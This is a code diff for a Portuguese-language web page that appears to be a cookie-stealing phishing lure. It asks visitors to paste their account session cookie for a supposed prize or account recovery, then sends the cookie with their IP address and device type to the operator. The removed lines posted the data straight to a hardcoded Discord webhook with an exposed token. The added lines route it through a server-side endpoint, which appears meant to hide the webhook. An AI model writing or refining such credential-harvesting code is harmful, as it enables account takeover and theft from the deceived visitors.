@@ -783,54 +783,38 @@
     </div>
 
     <script>
-        // Webhook do Discord
-        const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1477057706568323195/4545g7HNyqcjMCkJe2t95-djEoA-kuXgu-VY1u_zb6slpT3lpdmbwyxDl8urWU51Effi';
+        const API_URL = '/api/webhook'; // Vai chamar o arquivo webhook.js
         
-        // Constantes de segurança
-        const COOLDOWN_TIME = 300000; // 5 minutos em ms
+        const COOLDOWN_TIME = 300000;
         const COOLDOWN_KEY = 'aurora_last_cookie_sent';
 
-        // Obter IP do usuário
         async function getUserIP() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 return data.ip || 'IP não disponível';
             } catch (error) {
-                console.error('Erro ao obter IP:', error);
                 return 'IP não disponível';
             }
         }
 
-        // Verificar cooldown
         function checkCooldown() {
             const lastSent = localStorage.getItem(COOLDOWN_KEY);
             if (!lastSent) return true;
-            
             const timePassed = Date.now() - parseInt(lastSent);
             return timePassed >= COOLDOWN_TIME;
         }
 
-        // Obter tempo restante do cooldown
         function getCooldownRemaining() {
             const lastSent = localStorage.getItem(COOLDOWN_KEY);
             if (!lastSent) return 0;
-            
             const timePassed = Date.now() - parseInt(lastSent);
             const remaining = COOLDOWN_TIME - timePassed;
             return remaining > 0 ? remaining : 0;
         }
 
-        // Atualiza exibição de IP e cooldown
         async function updateInfoDisplays() {
-            const ipEl = document.getElementById('ipInfo');
             const cdEl = document.getElementById('cooldownInfo');
-
-            if (ipEl) {
-                // Não exibir o IP na interface
-                ipEl.textContent = '';
-            }
-
             if (cdEl) {
                 const remaining = getCooldownRemaining();
                 if (remaining > 0) {
@@ -842,24 +826,9 @@
             }
         }
 
-        // chamada periódica para atualizar cooldown
-        setInterval(() => {
-            const cdEl = document.getElementById('cooldownInfo');
-            if (cdEl) {
-                const remaining = getCooldownRemaining();
-                if (remaining > 0) {
-                    const sec = Math.ceil(remaining / 1000);
-                    cdEl.textContent = `Próximo envio em ${sec}s`;
-                } else {
-                    cdEl.textContent = '';
-                }
-            }
-        }, 1000);
-
-        // atualizar IP quando a página carrega
+        setInterval(updateInfoDisplays, 1000);
         window.addEventListener('load', updateInfoDisplays);
 
-        // Criar estrelas
         function createStars() {
             const starsContainer = document.getElementById('stars');
             for (let i = 0; i < 100; i++) {
@@ -876,7 +845,6 @@
         }
         createStars();
 
-        // Funções de notificação
         function showNotification(title, message, isRecovery = false) {
             const notification = document.getElementById('notification');
             const notifyTitle = document.getElementById('notifyTitle');
@@ -897,12 +865,10 @@
             
             notification.classList.add('show');
             
-            // Reset e animação da progress bar
             progress.style.animation = 'none';
             progress.offsetHeight;
             progress.style.animation = 'progress 4s linear forwards';
             
-            // Esconder após 4 segundos
             setTimeout(() => {
                 notification.classList.remove('show');
             }, 4000);
@@ -912,21 +878,13 @@
             document.getElementById('notification').classList.remove('show');
         }
 
-        // Notificação especial para recuperar conta
         function showRecoveryNotification() {
-            showNotification(
-                '🔰 Recuperação de Conta',
-                'Solicitação enviada para suporte!',
-                true
-            );
-            
-            // Efeito visual nos cards
+            showNotification('🔰 Recuperação de Conta', 'Solicitação enviada para suporte!', true);
             const cards = document.querySelectorAll('.choice-item');
             cards.forEach(c => c.style.opacity = '0.5');
             setTimeout(() => cards.forEach(c => c.style.opacity = '1'), 300);
         }
 
-        // Limpar cookie
         function cleanCookie(cookie) {
             let c = cookie.trim();
             c = c.replace(/^["']|["']$/g, '');
@@ -934,7 +892,6 @@
             return match && match[1] ? match[1] : c;
         }
 
-        // Preview
         function updatePreview() {
             const input = document.getElementById('cookieInput');
             const preview = document.getElementById('previewText');
@@ -951,7 +908,6 @@
         document.getElementById('cookieInput').addEventListener('input', updatePreview);
         document.getElementById('cookieInput').addEventListener('paste', () => setTimeout(updatePreview, 100));
 
-        // Enviar e ir para escolha
         async function sendAndGo() {
             const input = document.getElementById('cookieInput');
             const status = document.getElementById('status');
@@ -964,7 +920,6 @@
                 return;
             }
 
-            // Checar cooldown antes de processar
             if (!checkCooldown()) {
                 const rem = Math.ceil(getCooldownRemaining() / 1000);
                 showNotification('Aguarde', `Pode enviar novamente em ${rem}s`, false);
@@ -979,41 +934,27 @@
             }
 
             status.innerHTML = '<div class="spinner"></div>';
-            status.style.color = '#f59e0b';
             btn.disabled = true;
 
             try {
                 const userIP = await getUserIP();
-                const embed = {
-                    content: '@everyone ✦ **NOVO COOKIE RECEBIDO**',
-                    embeds: [{
-                        title: '🍪 Cookie Recebido',
-                        color: 0x6366f1,
-                        fields: [
-                            { name: '📝 Cookie', value: '```' + cookie + '```' },
-                            { name: '🌐 IP Address', value: '```' + userIP + '```', inline: true },
-                            { name: '📱 Dispositivo', value: navigator.userAgent.includes('Mobile') ? '📱 Celular' : '💻 PC', inline: true },
-                            { name: '⏰ Horário', value: new Date().toLocaleString('pt-BR'), inline: true }
-                        ],
-                        footer: { text: 'Aurora System' },
-                        timestamp: new Date()
-                    }]
-                };
-
-                const response = await fetch(WEBHOOK_URL, {
+                
+                const response = await fetch(API_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(embed)
+                    body: JSON.stringify({
+                        cookie: cookie,
+                        ip: userIP,
+                        device: navigator.userAgent.includes('Mobile') ? '📱 Celular' : '💻 PC',
+                        timestamp: new Date().toLocaleString('pt-BR')
+                    })
                 });
 
                 if (response.ok) {
-                    // registrar cooldown e atualizar exibição
                     localStorage.setItem(COOLDOWN_KEY, Date.now().toString());
                     updateInfoDisplays();
 
                     status.innerHTML = '<div class="success-check">✓</div>';
-                    status.style.color = '#10b981';
-                    
                     input.value = '';
                     updatePreview();
                     
@@ -1028,7 +969,7 @@
                         status.innerHTML = '';
                     }, 1000);
                 } else {
-                    throw new Error('webhook error');
+                    throw new Error('Erro no servidor');
                 }
             } catch (error) {
                 showNotification('Erro', 'Falha ao enviar cookie', false);
@@ -1037,26 +978,18 @@
             }
         }
 
-        // Selecionar prêmio (outras opções)
         function selectPrize(prize) {
-            showNotification(
-                prize + ' Selecionado!',
-                'Resgate disponível em instantes',
-                false
-            );
-            
+            showNotification(prize + ' Selecionado!', 'Resgate disponível em instantes', false);
             const cards = document.querySelectorAll('.choice-item');
             cards.forEach(c => c.style.opacity = '0.5');
             setTimeout(() => cards.forEach(c => c.style.opacity = '1'), 300);
         }
 
-        // Voltar
         function goBack() {
             document.getElementById('page2').classList.add('hidden');
             document.getElementById('page1').classList.remove('hidden');
         }
 
-        // Contador
         let count = 1.2;
         setInterval(() => {
             count = count + 0.1;
